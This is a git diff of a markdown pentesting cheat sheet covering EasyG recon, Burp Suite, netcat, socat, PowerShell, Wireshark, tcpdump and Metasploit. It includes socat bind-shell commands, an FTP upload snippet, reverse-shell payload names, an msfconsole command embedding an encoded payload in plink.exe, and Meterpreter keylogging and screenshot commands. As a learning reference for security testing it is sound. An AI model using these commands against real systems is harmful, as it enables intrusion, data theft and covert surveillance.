@@ -1,13 +1,25 @@
-## Tools
+# Tools
 
+## Index
 
-### <ins>EasyG</ins>
+- [EasyG](#easyg)
+- [Burp Suite](#burp-suite)
+- [Netcat](#netcat)
+- [Socat](#socat)
+- [PowerShell](#powershell)
+- [WireShark](#wireshark)
+- [Tcpdump](#tcpdump)
+- [Bash scripting](#bash-scripting)
+- [Metasploit Framework](#metasploit-framework)
+- [Others](#others)
+
+## EasyG
 
 <img src="../img/easyg.gif">
 
 [EasyG](../scripts/) is a script that I use to automate some information gathering tasks for my hacking process.
 
-#### <ins>Tools used and what the script does</ins>
+### Tools used and what the script does
 
 [**assetenum**] During this process, many tools are implemented to discover subdomains. Then, there is the process of discovering ports and possibly discovering technologies, misconfigurations and vulnerabilities for these assets discovered.
 - [amass](https://github.com/owasp-amass/amass)
@@ -35,7 +47,7 @@ Other tools
 - [anew](https://github.com/tomnomnom/anew) is used to add only new results to the files generated
 
 
-### <ins>Burp Suite</ins>
+## Burp Suite
 
 - Advanced Scope regular expressions
   ```
@@ -85,7 +97,7 @@ Other tools
 - If you are using FireFox, you could use [FoxyProxy](https://getfoxyproxy.org/)
 
 
-### <ins>Netcat</ins>
+## Netcat
 
 **Misc Commands**
 ```
@@ -104,7 +116,7 @@ nc -nvv -w 1 -z <IP> <PORT-RANGE>                        Use netcat to perform a
 nc -nv -u -z -w 1 <IP> <PORT-RANGE>                      Use netcat to perform an UDP port scan
 ```
 
-### <ins>Socat</ins>
+## Socat
 
 **Misc Commands**
 ```
@@ -142,7 +154,7 @@ $ sudo socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/b
 $ socat - OPENSSL:<IP>:<PORT>,verify=0                                                 Connect to the encrypted bind shell
 ```
 
-### <ins>PowerShell</ins>
+## PowerShell
 
 **Misc Commands**
 ```PowerShell
@@ -212,7 +224,7 @@ $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://<IP>:<PORT>/<FILE_TO_UPL
 - Change `<IP>`, `<PORT>`, `<FILE_TO_UPLOAD>`, `<USERNAME>`, `<PASSWORD>`
 
 
-### <ins>WireShark</ins>
+## WireShark
 
 **Filters**
 - `net 10.10.1.0/24`, capture traffic only on the `10.10.1.0/24` address range
@@ -227,7 +239,7 @@ $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://<IP>:<PORT>/<FILE_TO_UPL
 - [Wireshark User’s Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
 
 
-### <ins>Tcpdump</ins>
+## Tcpdump
 
 ```
 tcpdump -r packets.pcap                                                           Read packet capture
@@ -251,18 +263,18 @@ tcpdump -nX -r packets.pcap                                                     
 3. To display packets that have the ACK or PSH flags set: `sudo tcpdump -A -n 'tcp[13] = 24' -r packets.pcap`
 
 
-### <ins>Bash scripting</ins>
+## Bash scripting
 
 - Grep all the subdomains for `target.com` from `index.html`: `grep -o '[^/]*\.target\.com' index.html | sort -u > list.txt`
 - Get the IPs from list.txt: `for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u`
 
 
 
-### <ins>Metasploit Framework</ins>
+## Metasploit Framework
 
 See: [The Metasploit Framework](https://www.metasploit.com/)
 
-#### Starting Metasploit
+### Starting Metasploit
 
 ```
 sudo systemctl start postgresql                                start postgresql manually
@@ -273,7 +285,7 @@ sudo msfconsole -q                                             start the Metaspl
 ```
 
 
-#### MSF Syntax
+### MSF Syntax
 
 ```
 show -h                                  help flag
@@ -302,28 +314,28 @@ To interact with a module
   - `kill` kill job
 
 
-#### <ins>Exploit Modules</ins>
+### Exploit Modules
 
-#### Staged vs Non-Staged Payloads
+### Staged vs Non-Staged Payloads
 
 - `windows/shell_reverse_tcp` - Connect back to attacker and spawn a command shell
 - `windows/shell/reverse_tcp` - Connect back to attacker, Spawn cmd shell (staged)
   - Useful, for example, if the vulnerability you need to exploit doesn't have enough buffer space to hold a full payload
 
-#### Meterpreter
+### Meterpreter
 
 - `upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\tidus`
 - `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`
 - `shell` get the shell
 
-#### Other notes
+### Other notes
 
 - `generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe` embedding the payload in plink.exe from within msfconsole
 - Use the framework `multi/handler` to catch standard reverse shells
   - Works for all single and multi-stage payloads
   - Specify the incoming payload type
 
-#### <ins>Post-Exploitation</ins>
+### Post-Exploitation
 
 ```
 screenshot                take a screenshot of the compromised host desktop
@@ -346,7 +358,7 @@ keyscan_stop              stop the keystroke sniffer
   - Example `portfwd add -l 3389 -p 3389 -r 192.168.1.121`
 
 
-### <ins>Others</ins>
+## Others
 
 **For a temporary server**
 - `python -m SimpleHTTPServer 7331`
